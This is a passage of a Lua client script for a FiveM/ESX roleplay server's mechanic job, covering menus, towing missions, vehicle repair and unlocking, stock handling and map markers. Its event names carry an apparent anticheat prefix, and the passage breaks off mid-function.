-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local PlayerData = {}

local HasAlreadyEnteredMarker = false
local LastZone = nil

local CurrentAction = nil
local CurrentActionMsg = ''
local CurrentActionData = {}

local CurrentlyTowedVehicle = nil

local Blips = {}
local JobBlips = {}

local NPCOnJob = false
local NPCTargetTowable = nil
local NPCTargetTowableZone = nil
local NPCHasSpawnedTowable = false
local NPCLastCancel = GetGameTimer() - 5 * 60000
local NPCHasBeenNextToTowable = false
local NPCTargetDeleterZone = false

local IsDead = false
local IsBusy = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	PlayerData = ESX.GetPlayerData()
	deleteBlips()
	refreshBlips()
end)

RegisterNetEvent('::{korioz#0110}::esx:playerLoaded')
AddEventHandler('::{korioz#0110}::esx:playerLoaded', function(xPlayer)
	PlayerData = xPlayer

	deleteBlips()
	refreshBlips()
end)

function SelectRandomTowable()
	local index = GetRandomIntInRange(1,  #Config.Towables)

	for k,v in pairs(Config.Zones) do
		if v.Pos.x == Config.Towables[index].x and v.Pos.y == Config.Towables[index].y and v.Pos.z == Config.Towables[index].z then
			return k
		end
	end
end

function StartNPCJob()
	NPCOnJob = true

	NPCTargetTowableZone = SelectRandomTowable()
	local zone = Config.Zones[NPCTargetTowableZone]

	Blips['NPCTargetTowableZone'] = AddBlipForCoord(zone.Pos.x,  zone.Pos.y,  zone.Pos.z)
	SetBlipRoute(Blips['NPCTargetTowableZone'], true)

	ESX.ShowNotification(_U('drive_to_indicated'))
end

function StopNPCJob(cancel)
	if Blips['NPCTargetTowableZone'] ~= nil then
		RemoveBlip(Blips['NPCTargetTowableZone'])
		Blips['NPCTargetTowableZone'] = nil
	end

	if Blips['NPCDelivery'] ~= nil then
		RemoveBlip(Blips['NPCDelivery'])
		Blips['NPCDelivery'] = nil
	end

	Config.Zones.VehicleDelivery.Type = -1

	NPCOnJob = false
	NPCTargetTowable = nil
	NPCTargetTowableZone = nil
	NPCHasSpawnedTowable = false
	NPCHasBeenNextToTowable = false

	if cancel then
		ESX.ShowNotification(_U('mission_canceled'))
	end
end

function OpenMecanoActionsMenu()
	local elements = {
		{label = _U('vehicle_list'), value = 'vehicle_list'},
		{label = _U('work_wear'), value = 'cloakroom'},
		{label = _U('civ_wear'), value = 'cloakroom2'},
		{label = _U('deposit_stock'), value = 'put_stock'},
		{label = _U('withdraw_stock'), value = 'get_stock'}
	}

	if Config.EnablePlayerManagement and PlayerData.job ~= nil and PlayerData.job.grade_name == 'boss' then
		table.insert(elements, {label = _U('boss_actions'), value = 'boss_actions'})
	end

	ESX.UI.Menu.CloseAll()

	ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'mecano_actions', {
		title = _U('mechanic'),
		elements = elements
	}, function(data, menu)
		if data.current.value == 'vehicle_list' then
			if Config.EnableSocietyOwnedVehicles then
				local elements = {}

				ESX.TriggerServerCallback('::{korioz#0110}::esx_society:getVehiclesInGarage', function(vehicles)
					for i = 1, #vehicles, 1 do
						table.insert(elements, {
							label = GetDisplayNameFromVehicleModel(vehicles[i].model),
							rightlabel = {'[' .. vehicles[i].plate .. ']'},
							value = vehicles[i]
						})
					end

					ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'vehicle_spawner', {
						title = _U('service_vehicle'),
						elements = elements
					}, function(data, menu)
						menu.close()
						local vehicleProps = data.current.value

						ESX.Game.SpawnVehicle(vehicleProps.model, Config.Zones.VehicleSpawnPoint.Pos, Config.Zones.VehicleSpawnPoint.Heading, function(vehicle)
							ESX.Game.SetVehicleProperties(vehicle, vehicleProps)
						end)

						_TriggerServerEvent('::{korioz#0110}::esx_society:removeVehicleFromGarage', 'mecano', vehicleProps)
					end, function(data, menu)
					end)
				end, 'mecano')
			else
				local elements = {
					{label = _U('flat_bed'), value = 'flatbed'},
					{label = _U('tow_truck'), value = 'towtruck2'}
				}

				if Config.EnablePlayerManagement and PlayerData.job ~= nil and (PlayerData.job.grade_name == 'boss' or PlayerData.job.grade_name == 'chef' or PlayerData.job.grade_name == 'experimente') then
					table.insert(elements, {label = 'SlamVan', value = 'slamvan3'})
				end

				ESX.UI.Menu.CloseAll()

				ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'spawn_vehicle', {
					title = _U('service_vehicle'),
					elements = elements
				}, function(data, menu)
					if Config.MaxInService == -1 then
						ESX.Game.SpawnVehicle(data.current.value, Config.Zones.VehicleSpawnPoint.Pos, Config.Zones.VehicleSpawnPoint.Heading, function(vehicle)
							local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('MECA')
							SetVehicleNumberPlateText(vehicle, newPlate)
							_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:givekey', 'no', newPlate)
						end)
					else
						ESX.TriggerServerCallback('::{korioz#0110}::esx_service:enableService', function(canTakeService, maxInService, inServiceCount)
							if canTakeService then
								ESX.Game.SpawnVehicle(data.current.value, Config.Zones.VehicleSpawnPoint.Pos, Config.Zones.VehicleSpawnPoint.Heading, function(vehicle)
									local newPlate = exports['esx_vehicleshop']:GenerateSocietyPlate('MECA')
									SetVehicleNumberPlateText(vehicle, newPlate)
									_TriggerServerEvent('::{korioz#0110}::esx_vehiclelock:givekey', 'no', newPlate)
								end)
							else
								ESX.ShowNotification(_U('service_full') .. inServiceCount .. '/' .. maxInService)
							end
						end, 'mecano')
					end

					menu.close()
				end, function(data, menu)
				end)
			end
		elseif data.current.value == 'cloakroom' then
			menu.close()
			setUniform("mecano_wear", playerPed)
		elseif data.current.value == 'cloakroom2' then
			menu.close()
			ESX.TriggerServerCallback('::{korioz#0110}::esx_skin:getPlayerSkin', function(skin, jobSkin)
				TriggerEvent('::{korioz#0110}::skinchanger:loadSkin', skin)
			end)
		elseif data.current.value == 'put_stock' then
			OpenPutStocksMenu()
		elseif data.current.value == 'get_stock' then
			OpenGetStocksMenu()
		elseif data.current.value == 'boss_actions' then
			TriggerEvent('::{korioz#0110}::esx_society:openBossMenu', 'mecano', function(data, menu) end)
		end
	end, function(data, menu)
		CurrentAction = 'mecano_actions_menu'
		CurrentActionMsg = _U('open_actions')
		CurrentActionData = {}
	end)
end

function OpenMecanoHarvestMenu()
	if Config.EnablePlayerManagement and PlayerData.job ~= nil and PlayerData.job.grade_name ~= 'recrue' then
		local elements = {
			{label = _U('gas_can'), value = 'gaz_bottle'},
			{label = _U('repair_tools'), value = 'fix_tool'},
			{label = _U('body_work_tools'), value = 'caro_tool'}
		}

		ESX.UI.Menu.CloseAll()

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'mecano_harvest', {
			title = _U('harvest'),
			elements = elements
		}, function(data, menu)
			if data.current.value == 'gaz_bottle' then
				menu.close()
				_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:startHarvest')
			elseif data.current.value == 'fix_tool' then
				menu.close()
				_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:startHarvest2')
			elseif data.current.value == 'caro_tool' then
				menu.close()
				_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:startHarvest3')
			end
		end, function(data, menu)
			CurrentAction = 'mecano_harvest_menu'
			CurrentActionMsg = _U('harvest_menu')
			CurrentActionData = {}
		end)
	else
		ESX.ShowNotification(_U('not_experienced_enough'))
	end
end

function OpenMecanoCraftMenu()
	if Config.EnablePlayerManagement and PlayerData.job ~= nil and PlayerData.job.grade_name ~= 'recrue' then

		local elements = {
			{label = _U('blowtorch'),  value = 'blow_pipe'},
			{label = _U('repair_kit'), value = 'fix_kit'},
			{label = _U('body_kit'),   value = 'caro_kit'}
		}

		ESX.UI.Menu.CloseAll()

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'mecano_craft', {
			title = _U('craft'),
			elements = elements
		}, function(data, menu)
			if data.current.value == 'blow_pipe' then
				menu.close()
				_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:startCraft')
			elseif data.current.value == 'fix_kit' then
				menu.close()
				_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:startCraft2')
			elseif data.current.value == 'caro_kit' then
				menu.close()
				_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:startCraft3')
			end
		end, function(data, menu)
			CurrentAction = 'mecano_craft_menu'
			CurrentActionMsg = _U('craft_menu')
			CurrentActionData = {}
		end)
	else
		ESX.ShowNotification(_U('not_experienced_enough'))
	end
end

Citizen.CreateThread(function()	
	WarMenu.CreateMenu('mecanomenu', 'Mécano')
	WarMenu.SetSubTitle("mecanomenu", "ACTIONS MECANO")
	WarMenu.SetTitleColor("mecanomenu", 0, 0, 0, 255)
	WarMenu.SetTitleBackgroundColor("mecanomenu", 132, 64, 0, 150)

	while true do
		if WarMenu.IsMenuOpened('mecanomenu') then
			if WarMenu.Button(_U('billing')) then
				ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'billing', {
					title = _U('invoice_amount')
				}, function(data, menu)
					local var = data.value

					if var == nil or var < 0 then
						ESX.ShowNotification(_U('amount_invalid'))
					else
						local closestPlayer, closestDistance = ESX.Game.GetClosestPlayer()

						if closestPlayer == -1 or closestDistance > 3.0 then
							menu.close()
							ESX.ShowNotification(_U('no_players_nearby'))
						else
							menu.close()
							_TriggerServerEvent('::{korioz#0110}::esx_billing:sendBill', GetPlayerServerId(closestPlayer), 'society_mecano', _U('mechanic'), var)
						end
					end
				end, function(data, menu)
					menu.close()
				end)
			elseif WarMenu.Button(_U('hijack')) then
				local playerPed = PlayerPedId()
				local vehicle = ESX.Game.GetVehicleInDirection()
				local coords = GetEntityCoords(playerPed, false)

				if IsPedSittingInAnyVehicle(playerPed) then
					ESX.ShowNotification(_U('inside_vehicle'))
					return
				end

				if DoesEntityExist(vehicle) then
					TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_WELDING", 0, true)
					Citizen.CreateThread(function()
						Citizen.Wait(10000)

						SetVehicleDoorsLocked(vehicle, 1)
						SetVehicleDoorsLockedForAllPlayers(vehicle, false)
						ClearPedTasksImmediately(playerPed)

						ESX.ShowNotification(_U('vehicle_unlocked'))
					end)
				else
					ESX.ShowNotification(_U('no_vehicle_nearby'))
				end
			elseif WarMenu.Button(_U('repair')) then
				local playerPed = PlayerPedId()
				local vehicle = ESX.Game.GetVehicleInDirection()
				local coords = GetEntityCoords(playerPed, false)

				if IsPedSittingInAnyVehicle(playerPed) then
					ESX.ShowNotification(_U('inside_vehicle'))
					return
				end

				if DoesEntityExist(vehicle) then
					TaskStartScenarioInPlace(playerPed, "PROP_HUMAN_BUM_BIN", 0, true)
					Citizen.CreateThread(function()
						Citizen.Wait(20000)

						SetVehicleFixed(vehicle)
						SetVehicleDeformationFixed(vehicle)
						SetVehicleUndriveable(vehicle, false)
						SetVehicleEngineOn(vehicle, true, true)
						ClearPedTasksImmediately(playerPed)

						ESX.ShowNotification(_U('vehicle_repaired'))
					end)
				else
					ESX.ShowNotification(_U('no_vehicle_nearby'))
				end
			elseif WarMenu.Button(_U('clean')) then
				local playerPed = PlayerPedId()
				local vehicle = ESX.Game.GetVehicleInDirection()
				local coords = GetEntityCoords(playerPed, false)

				if IsPedSittingInAnyVehicle(playerPed) then
					ESX.ShowNotification(_U('inside_vehicle'))
					return
				end

				if DoesEntityExist(vehicle) then
					TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_MAID_CLEAN", 0, true)
					Citizen.CreateThread(function()
						Citizen.Wait(10000)

						SetVehicleDirtLevel(vehicle, 0)
						ClearPedTasksImmediately(playerPed)

						ESX.ShowNotification(_U('vehicle_cleaned'))
					end)
				else
					ESX.ShowNotification(_U('no_vehicle_nearby'))
				end
			elseif WarMenu.Button(_U('imp_veh')) then
				local playerPed = PlayerPedId()

				if IsPedSittingInAnyVehicle(playerPed) then
					local vehicle = GetVehiclePedIsIn(playerPed, false)

					if GetPedInVehicleSeat(vehicle, -1) == playerPed then
						ESX.ShowNotification(_U('vehicle_impounded'))
						ESX.Game.DeleteVehicle(vehicle)
					else
						ESX.ShowNotification(_U('must_seat_driver'))
					end
				else
					local vehicle = ESX.Game.GetVehicleInDirection()

					if DoesEntityExist(vehicle) then
						ESX.ShowNotification(_U('vehicle_impounded'))
						ESX.Game.DeleteVehicle(vehicle)
					else
						ESX.ShowNotification(_U('must_near'))
					end
				end
			elseif WarMenu.Button(_U('flat_bed')) then
				local playerPed = PlayerPedId()
				local vehicle = GetVehiclePedIsIn(playerPed, true)

				local towmodel = `flatbed`
				local isVehicleTow = IsVehicleModel(vehicle, towmodel)

				if isVehicleTow then
					local targetVehicle = ESX.Game.GetVehicleInDirection()

					if CurrentlyTowedVehicle == nil then
						if targetVehicle ~= 0 then
							if not IsPedInAnyVehicle(playerPed, true) then
								if vehicle ~= targetVehicle then
									AttachEntityToEntity(targetVehicle, vehicle, 20, -0.5, -5.0, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 20, true)
									CurrentlyTowedVehicle = targetVehicle
									ESX.ShowNotification(_U('vehicle_success_attached'))

									if NPCOnJob then
										if NPCTargetTowable == targetVehicle then
											ESX.ShowNotification(_U('please_drop_off'))
											Config.Zones.VehicleDelivery.Type = 1

											if Blips['NPCTargetTowableZone'] ~= nil then
												RemoveBlip(Blips['NPCTargetTowableZone'])
												Blips['NPCTargetTowableZone'] = nil
											end

											Blips['NPCDelivery'] = AddBlipForCoord(Config.Zones.VehicleDelivery.Pos.x, Config.Zones.VehicleDelivery.Pos.y, Config.Zones.VehicleDelivery.Pos.z)
											SetBlipRoute(Blips['NPCDelivery'], true)
										end
									end
								else
									ESX.ShowNotification(_U('cant_attach_own_tt'))
								end
							end
						else
							ESX.ShowNotification(_U('no_veh_att'))
						end
					else
						AttachEntityToEntity(CurrentlyTowedVehicle, vehicle, 20, -0.5, -12.0, 1.0, 0.0, 0.0, 0.0, false, false, false, false, 20, true)
						DetachEntity(CurrentlyTowedVehicle, true, true)

						if NPCOnJob then
							if NPCTargetDeleterZone then

								if CurrentlyTowedVehicle == NPCTargetTowable then
									ESX.Game.DeleteVehicle(NPCTargetTowable)
									_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:onNPCJobMissionCompleted')
									StopNPCJob()
									NPCTargetDeleterZone = false
								else
									ESX.ShowNotification(_U('not_right_veh'))
								end

							else
								ESX.ShowNotification(_U('not_right_place'))
							end
						end

						CurrentlyTowedVehicle = nil
						ESX.ShowNotification(_U('veh_det_succ'))
					end
				else
					ESX.ShowNotification(_U('imp_flatbed'))
				end
			end

			WarMenu.Display()
		end

		Citizen.Wait(0)
	end
end)

function OpenGetStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_mecanojob:getStockItems', function(items)
		local elements = {}

		for i = 1, #items, 1 do
			table.insert(elements, {
				label = items[i].label,
				rightlabel = {'(' .. items[i].count .. ')'},
				value = items[i].name
			})
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = _U('mechanic_stock'),
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_get_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('invalid_quantity'))
				else
					menu2.close()
					menu.close()
					_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:getStockItem', itemName, count)

					Citizen.Wait(1000)
					OpenGetStocksMenu()
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

function OpenPutStocksMenu()
	ESX.TriggerServerCallback('::{korioz#0110}::esx_mecanojob:getPlayerInventory', function(inventory)
		local elements = {}

		for i = 1, #inventory.items, 1 do
			local item = inventory.items[i]

			if item.count > 0 then
				table.insert(elements, {
					label = item.label,
					rightlabel = {'(' .. item.count .. ')'},
					type = 'item_standard',
					value = item.name
				})
			end
		end

		ESX.UI.Menu.Open('default', GetCurrentResourceName(), 'stocks_menu', {
			title = _U('inventory'),
			elements = elements
		}, function(data, menu)
			local itemName = data.current.value

			ESX.UI.Menu.Open('dialog', GetCurrentResourceName(), 'stocks_menu_put_item_count', {
				title = _U('quantity')
			}, function(data2, menu2)
				local count = tonumber(data2.value)

				if count == nil then
					ESX.ShowNotification(_U('invalid_quantity'))
				else
					menu2.close()
					menu.close()
					_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:putStockItems', itemName, count)

					Citizen.Wait(1000)
					OpenPutStocksMenu()
				end
			end, function(data2, menu2)
				menu2.close()
			end)
		end, function(data, menu)
		end)
	end)
end

RegisterNetEvent('::{korioz#0110}::esx_mecanojob:onHijack')
AddEventHandler('::{korioz#0110}::esx_mecanojob:onHijack', function()
	local playerPed = PlayerPedId()
	local coords = GetEntityCoords(playerPed, false)

	if IsAnyVehicleNearPoint(coords.x, coords.y, coords.z, 5.0) then
		local vehicle = nil

		if IsPedInAnyVehicle(playerPed, false) then
			vehicle = GetVehiclePedIsIn(playerPed, false)
		else
			vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 5.0, 0, 71)
		end

		local chance = math.random(100)
		local alarm = math.random(100)

		if DoesEntityExist(vehicle) then
			if alarm <= 33 then
				SetVehicleAlarm(vehicle, true)
				StartVehicleAlarm(vehicle)
			end

			TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_WELDING", 0, true)

			Citizen.CreateThread(function()
				Citizen.Wait(10000)
				if chance <= 66 then
					SetVehicleDoorsLocked(vehicle, 1)
					SetVehicleDoorsLockedForAllPlayers(vehicle, false)
					ClearPedTasksImmediately(playerPed)
					ESX.ShowNotification(_U('veh_unlocked'))
				else
					ESX.ShowNotification(_U('hijack_failed'))
					ClearPedTasksImmediately(playerPed)
				end
			end)
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_mecanojob:onCarokit')
AddEventHandler('::{korioz#0110}::esx_mecanojob:onCarokit', function()
	local playerPed = PlayerPedId()
	local coords = GetEntityCoords(playerPed, false)

	if IsAnyVehicleNearPoint(coords.x, coords.y, coords.z, 5.0) then
		local vehicle = nil

		if IsPedInAnyVehicle(playerPed, false) then
			vehicle = GetVehiclePedIsIn(playerPed, false)
		else
			vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 5.0, 0, 71)
		end

		if DoesEntityExist(vehicle) then
			TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_HAMMERING", 0, true)
			Citizen.CreateThread(function()
				Citizen.Wait(10000)
				SetVehicleFixed(vehicle)
				SetVehicleDeformationFixed(vehicle)
				ClearPedTasksImmediately(playerPed)
				ESX.ShowNotification(_U('body_repaired'))
			end)
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_mecanojob:onFixkit')
AddEventHandler('::{korioz#0110}::esx_mecanojob:onFixkit', function()
	local playerPed = PlayerPedId()
	local coords = GetEntityCoords(playerPed, false)

	if IsAnyVehicleNearPoint(coords.x, coords.y, coords.z, 5.0) then
		local vehicle = nil

		if IsPedInAnyVehicle(playerPed, false) then
			vehicle = GetVehiclePedIsIn(playerPed, false)
		else
			vehicle = GetClosestVehicle(coords.x, coords.y, coords.z, 5.0, 0, 71)
		end

		if DoesEntityExist(vehicle) then
			TaskStartScenarioInPlace(playerPed, "PROP_HUMAN_BUM_BIN", 0, true)
			Citizen.CreateThread(function()
				Citizen.Wait(20000)
				SetVehicleFixed(vehicle)
				SetVehicleDeformationFixed(vehicle)
				SetVehicleUndriveable(vehicle, false)
				ClearPedTasksImmediately(playerPed)
				ESX.ShowNotification(_U('veh_repaired'))
			end)
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::esx:setJob')
AddEventHandler('::{korioz#0110}::esx:setJob', function(job)
	PlayerData.job = job
	deleteBlips()
	refreshBlips()
end)

AddEventHandler('::{korioz#0110}::esx_mecanojob:hasEnteredMarker', function(zone)
	if zone =='VehicleDelivery' then
		NPCTargetDeleterZone = true
	elseif zone == 'MecanoActions' then
		CurrentAction = 'mecano_actions_menu'
		CurrentActionMsg = _U('open_actions')
		CurrentActionData = {}
	elseif zone == 'Garage' then
		CurrentAction = 'mecano_harvest_menu'
		CurrentActionMsg = _U('harvest_menu')
		CurrentActionData = {}
	elseif zone == 'Craft' then
		CurrentAction = 'mecano_craft_menu'
		CurrentActionMsg = _U('craft_menu')
		CurrentActionData = {}
	elseif zone == 'VehicleDeleter' then
		local playerPed = PlayerPedId()

		if IsPedInAnyVehicle(playerPed, false) then
			local vehicle = GetVehiclePedIsIn(playerPed, false)
			CurrentAction = 'delete_vehicle'
			CurrentActionMsg = _U('veh_stored')
			CurrentActionData = {vehicle = vehicle}
		end
	end
end)

AddEventHandler('::{korioz#0110}::esx_mecanojob:hasExitedMarker', function(zone)
	if zone =='VehicleDelivery' then
		NPCTargetDeleterZone = false
	elseif zone == 'Craft' then
		_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:stopCraft')
		_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:stopCraft2')
		_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:stopCraft3')
	elseif zone == 'Garage' then
		_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:stopHarvest')
		_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:stopHarvest2')
		_TriggerServerEvent('::{korioz#0110}::esx_mecanojob:stopHarvest3')
	end

	CurrentAction = nil
	ESX.UI.Menu.CloseAll()
end)

AddEventHandler('::{korioz#0110}::esx_mecanojob:hasEnteredEntityZone', function(entity)
	local playerPed = PlayerPedId()

	if PlayerData.job ~= nil and PlayerData.job.name == 'mecano' and not IsPedInAnyVehicle(playerPed, false) then
		CurrentAction = 'remove_entity'
		CurrentActionMsg = _U('press_remove_obj')
		CurrentActionData = {entity = entity}
	end
end)

AddEventHandler('::{korioz#0110}::esx_mecanojob:hasExitedEntityZone', function(entity)
	if CurrentAction == 'remove_entity' then
		CurrentAction = nil
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(10)

		if NPCTargetTowableZone ~= nil and not NPCHasSpawnedTowable then
			local coords = GetEntityCoords(PlayerPedId(), false)
			local zone = Config.Zones[NPCTargetTowableZone]

			if GetDistanceBetweenCoords(coords, zone.Pos.x, zone.Pos.y, zone.Pos.z, true) < Config.NPCSpawnDistance then
				local model = Config.Vehicles[GetRandomIntInRange(1,  #Config.Vehicles)]

				ESX.Game.SpawnVehicle(model, zone.Pos, 0, function(vehicle)
					NPCTargetTowable = vehicle
				end)

				NPCHasSpawnedTowable = true
			end
		end

		if NPCTargetTowableZone ~= nil and NPCHasSpawnedTowable and not NPCHasBeenNextToTowable then
			local coords = GetEntityCoords(PlayerPedId(), false)
			local zone = Config.Zones[NPCTargetTowableZone]

			if GetDistanceBetweenCoords(coords, zone.Pos.x, zone.Pos.y, zone.Pos.z, true) < Config.NPCNextToDistance then
				ESX.ShowNotification(_U('please_tow'))
				NPCHasBeenNextToTowable = true
			end
		end

	end
end)

-- Create Blips
function deleteBlips()
	if JobBlips[1] ~= nil then
		for i = 1, #JobBlips, 1 do
			RemoveBlip(JobBlips[i])
			JobBlips[i] = nil
		end
	end
end

function refreshBlips()
	if PlayerData.job ~= nil then
		for k, v in pairs(Config.Blips) do
			if v.isMecanoOnly then
				if PlayerData.job.name == 'mecano' then
					local blip = AddBlipForCoord(v.Pos.x, v.Pos.y, v.Pos.z)

					SetBlipSprite(blip, v.Sprite)
					SetBlipDisplay(blip, 4)
					SetBlipScale(blip, v.Scale)
					SetBlipColour(blip, 5)
					SetBlipAsShortRange(blip, true)

					BeginTextCommandSetBlipName("STRING")
					AddTextComponentSubstringPlayerName(v.Name)
					EndTextCommandSetBlipName(blip)

					table.insert(JobBlips, blip)
				end
			else
				local blip = AddBlipForCoord(v.Pos.x, v.Pos.y, v.Pos.z)

				SetBlipSprite(blip, v.Sprite)
				SetBlipDisplay(blip, 4)
				SetBlipScale(blip, v.Scale)
				SetBlipColour(blip, 5)
				SetBlipAsShortRange(blip, true)

				BeginTextCommandSetBlipName("STRING")
				AddTextComponentSubstringPlayerName(v.Name)
				EndTextCommandSetBlipName(blip)

				table.insert(JobBlips, blip)
			end
		end
	end
end

-- Display markers
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		if PlayerData.job ~= nil and PlayerData.job.name == 'mecano' then
			local coords = GetEntityCoords(PlayerPedId(), false)

			for k, v in pairs(Config.Zones) do
				if (v.Type ~= -1 and GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < Config.DrawDistance) then
					DrawMarker(v.Type, v.Pos.x, v.Pos.y, v.Pos.z, 0.0, 0.0, 0.0, 0, 0.0, 0.0, v.Size.x, v.Size.y, v.Size.z, v.Color.r, v.Color.g, v.Color.b, 100, false, true, 2, false, false, false, false)
				end
			end
		end
	end
end)

-- Enter / Exit marker events
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(10)

		if PlayerData.job ~= nil and PlayerData.job.name == 'mecano' then
			local coords = GetEntityCoords(PlayerPedId(), false)
			local isInMarker = false
			local currentZone = nil

			for k, v in pairs(Config.Zones) do
				if (GetDistanceBetweenCoords(coords, v.Pos.x, v.Pos.y, v.Pos.z, true) < v.Size.x) then
					isInMarker = true
					currentZone = k
				end
			end

			if (isInMarker and not HasAlreadyEnteredMarker) or (isInMarker and LastZone ~= currentZone) then
				HasAlreadyEnteredMarker = true
				LastZone = currentZone
				TriggerEvent('::{korioz#0110}::esx_mecanojob:hasEnteredMarker', currentZone)
			end

			if not isInMarker and HasAlreadyEnteredMarker then
				HasAlreadyEnteredMarker = false
				TriggerEvent('::{korioz#0110}::esx_mecanojob:hasExitedMarker', LastZone)
			end
		end
	end
end)

Citizen.CreateThread(function()
	local trackedEntities = {
		`prop_roadcone02a`,
		`prop_toolchest_01`
	}

	while true do
		Citizen.Wait(500)
		local playerPed = PlayerPedId()
		local coords = GetEntityCoords(playerPed, false)

		local closestDistance = -1
		local closestEntity = nil

		for i = 1, #trackedEntities, 1 do
			local object = GetClosestObjectOfType(coords, 3.0, trackedEntities[i], false, false, false)

			if DoesEntityExist(object) then
				local objCoords = GetEntityCoords(object, false)
				local distance = GetDistanceBetweenCoords(coords, objCoords, true)

				if closestDistance == -1 or closestDistance > distance then
					closestDistance = distance
					closestEntity = object
				end
			end
		end

		if closestDistance ~= -1 and closestDistance <= 3.0 then
			if LastEntity ~= closestEntity then
				TriggerEvent('::{korioz#0110}::esx_mecanojob:hasEnteredEntityZone', closestEntity)
				LastEntity = closestEntity
			end
		else
			if LastEntity ~= nil then
				TriggerEvent('::{korioz#0110}::esx_mecanojob:hasExitedEntityZone', LastEntity)
				LastEntity = nil
			end
		end
	end
end)

-- Key Controls
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(10)

		if CurrentAction ~= nil then
			ESX.ShowHelpNotification(CurrentActionMsg)

			if IsControlJustReleased(0, 38) and PlayerData.job ~= nil and PlayerData.job.name == 'mecano' then
				if CurrentAction == 'mecano_actions_menu' then
					OpenMecanoActionsMenu()
				elseif CurrentAction == 'mecano_harvest_menu' then
					OpenMecanoHarvestMenu()
				elseif CurrentAction == 'mecano_craft_menu' then
					OpenMecanoCraftMenu()
				elseif CurrentAction == 'delete_vehicle' then
					if Config.EnableSocietyOwnedVehicles then
						local vehicleProps = ESX.Game.GetVehicleProperties(CurrentActionData.vehicle)
						_TriggerServerEvent('::{korioz#0110}::esx_society:putVehicleInGarage', 'mecano', vehicleProps)
					else
						if
							GetEntityModel(vehicle) == `flatbed` or
							GetEntityModel(vehicle) == `towtruck2` or
							GetEntityModel(vehicle) == `slamvan3`
						then
							_TriggerServerEvent('::{korioz#0110}::esx_service:disableService', 'mecano')
						end
					end

					ESX.Game.DeleteVehicle(CurrentActionData.vehicle)
				elseif CurrentAction == 'remove_entity' then
					DeleteEntity(CurrentActionData.entity)
				end

				CurrentAction = nil
			end
		end

		if (IsControlJustReleased(0, 167) or IsDisabledControlJustReleased(0, 167)) and not IsDead and PlayerData.job ~= nil and PlayerData.job.name == 'mecano' then
			WarMenu.OpenMenu('mecanomenu')
		end

		if IsControlJustReleased(0, 178) and not IsDead and PlayerData.job ~= nil and PlayerData.job.name == 'mecano' then
			if NPCOnJob then
				if GetGameTimer() - NPCLastCancel > 5 * 60000 then
					StopNPCJob(true)
					NPCLastCancel = GetGameTimer()
				else
					ESX.ShowNotification(_U('wait_five'))
				end
			else
				local playerPed = PlayerPedId()

				if IsPedInAnyVehicle(playerPed, false) and IsVehicleModel(GetVehiclePedIsIn(playerPed, false), `flatbed`) then
					StartNPCJob()
				else
					ESX.ShowNotification(_U('must_in_flatbed'))
				end
			end
		end
	end
end)

AddEventHandler('::{korioz#0110}::esx:onPlayerDeath', function()
	IsDead = true
end)

AddEventHandler('playerSpawned', function()
	IsDead = false
end)

function setUniform(job, playerPed)
	TriggerEvent('::{korioz#0110}::skinchanger:getSkin', function(skin)
		if skin.sex == 0 then
			if Config.Uniforms[job].male then
				TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, Config.Uniforms[job].male)
				ESX.ShowAdvancedNotification("Mécano", "~h~Prise de service~s~", "Vous avez ~r~pris~s~ votre service", "CHAR_MECHANIC", 1)
			else
				ESX.ShowAdvancedNotification("Mécano", "Tenue de travail", "~r~Aucun uniforme~s~ à votre taille", "CHAR_MECHANIC", 1)
			end
		else
			if Config.Uniforms[job].female then
				TriggerEvent('::{korioz#0110}::skinchanger:loadClothes', skin, Config.Uniforms[job].female)
